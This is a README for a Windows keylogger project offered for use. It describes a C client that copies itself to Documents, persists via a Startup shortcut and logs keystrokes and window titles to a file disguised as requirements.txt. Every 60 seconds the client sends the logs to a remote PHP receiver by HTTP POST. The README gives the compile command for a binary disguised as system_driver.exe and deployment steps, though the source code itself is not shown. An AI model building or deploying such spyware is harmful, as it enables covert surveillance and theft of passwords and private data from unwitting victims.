# Windows Keylogger & Remote Exfiltrator
* This project provides a simple implementation of a background keylogger for Windows systems, featuring persistence and automatic data exfiltration to a remote server.

# Components
* Client (main.c): A C program that establishes persistence in the Startup folder upon execution. It logs keystrokes and the titles of active windows into a local file named requirements.txt. Every 60 seconds, it sends the logged data to a configured server via an HTTP POST request.

* Server (receiver.php): A PHP script designed to receive the incoming data. It appends the received logs to a local logs.txt file, including a timestamp for each entry.

# Compilation (Visual Studio MSVC)
* To compile the client, use the Developer Command Prompt for Visual Studio and run the following command:

```cl main.c /Fe:system_driver.exe /O2 user32.lib kernel32.lib wininet.lib advapi32.lib /link /SUBSYSTEM:WINDOWS```

# Setup
* Modify the main.c file and update the SERVER definition to point to the domain where your receiver.php script is hosted.
* Upload receiver.php to your web server.

* Once system_driver.exe is executed, it copies itself to the Documents folder and creates a shortcut in the Startup directory to ensure it runs automatically on system boot.

